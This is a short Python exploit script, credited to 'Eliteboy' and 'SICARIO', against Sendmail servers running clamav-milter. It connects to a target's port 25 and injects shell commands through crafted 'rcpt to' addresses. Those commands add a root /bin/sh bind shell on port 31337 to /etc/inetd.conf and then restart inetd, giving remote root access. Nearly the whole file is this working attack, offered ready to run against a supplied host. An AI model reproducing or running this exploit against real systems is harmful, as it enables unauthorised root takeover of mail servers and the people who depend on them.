import sys
import socket

# ASCII art of a clam
clam_banner = """
   ________                ___ _    __
  / ____/ /___ _____ ___  /   | |  / /
 / /   / / __ `/ __ `__ \/ /| | | / / 
/ /___/ / /_/ / / / / / / ___ | |/ /  
\____/_/\__,_/_/ /_/ /_/_/  |_|___/ 
           _.-''|''-._
        .-'     |     `-.
      .'\       |       /`.
    .'   \      |      /   `.
    \     \     |     /     /
     `\    \    |    /    /'
       `\   \   |   /   /'
         `\  \  |  /  /'	
   23   _.-`\ \ | / /'-._
       {_____`\\|//'_____}
               `-'
               
Clam AntiVirus 'clamav-milter' Remote Code Execution Exploit
               
"""

print(clam_banner)
print("Sendmail w/ clamav-milter Remote Root Exploit")
print("Copyright (C) 2007 Eliteboy")
print("Remix (C) 2023 SICARIO \n")

if len(sys.argv) != 2:
    print("Give me a host to connect.")
    sys.exit()

host = sys.argv[1]
port = 25

print(f"Attacking {host}...\n")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host, port))
    
    sock.sendall(b"ehlo you\r\n")
    sock.sendall(b"mail from: <>\r\n")
    sock.sendall(b"rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n")
    sock.sendall(b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n")
    sock.sendall(b"data\r\n.\r\nquit\r\n")
    
    data = sock.recv(1024)
    print(data.decode())
